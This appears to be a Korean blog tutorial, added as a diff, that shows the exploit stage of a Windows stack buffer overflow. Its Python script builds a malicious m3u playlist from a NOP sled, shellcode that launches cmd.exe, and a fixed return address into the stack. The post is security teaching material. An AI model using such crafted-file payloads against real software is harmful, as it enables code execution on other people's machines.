@@ -1,0 +1,35 @@
+---
+title:  "Windows Stack Buffer Overflow 3 - 익스플로잇"
+search: true
+categories: 
+  - Windows Userland
+last_modified_at: 2025-06-05
+comments: true 
+published: true
+---
+
+### 익스플로잇
+- 셸코드 작성을 완료했으니, 익스플로잇을 해보자.
+- Access Violation이 발생했을 당시의 레지스터 상태
+  <img src="/assets/img/windows/sbof/1.png">
+  - esp 레지스터가 `0x16f30c`로 되어 있다. ASLR이 적용되지 않으므로 스택 주소는 언제나 동일하다.
+  - 혹시 스택 오프셋이 일부 변하는 경우를 생각하여 NOP Sled와 함께 셸코드를 입력한다.
+- m3u 파일 생성 코드
+
+```py
+import os
+if os.path.exists("exploit.m3u"): os.remove("exploit.m3u")
+
+shellcode = b"\x66\x81\xEC\x08\x01\x31\xC9\xB1\x30\x64\x8B\x31\x8B\x76\x0C\x8B\x76\x14\x8B\x36\x8B\x36\x8B\x76\x10\x81\xC6\x68\x9C\x3A\x12\x81\xEE\x78\x56\x34\x12\x31\xDB\x53\x68\x2E\x65\x78\x65\x68\x5C\x63\x6D\x64\x68\x65\x6D\x33\x32\x68\x53\x79\x73\x74\x68\x6F\x77\x73\x5C\x68\x57\x69\x6E\x64\x68\xFF\x43\x3A\x5C\x89\xE3\x80\xC3\x01\x6A\x01\x53\xFF\xD6"
+
+with open("exploit.m3u", "wb") as f:
+	payload = b"\x90"*(26000+(0x57-0x42)*4+2 - len(shellcode))  # NOP Sled
+	payload += shellcode                                        # Shellcode
+	payload += b"\x40\xef\x16\x00"                              # Return Address(to NOP Sled)
+	payload += b"B"*(28000-len(payload))
+	f.write(payload)
+```
+  - 반환 주소는 Access Violation이 발생했을 당시의 esp보다 약간 더 높게 지정하여 NOP Sled 상에 위치하도록 한다.
+
+### 실행 결과
+<img src="/assets/img/windows/sbof/1.gif" class="post-image">
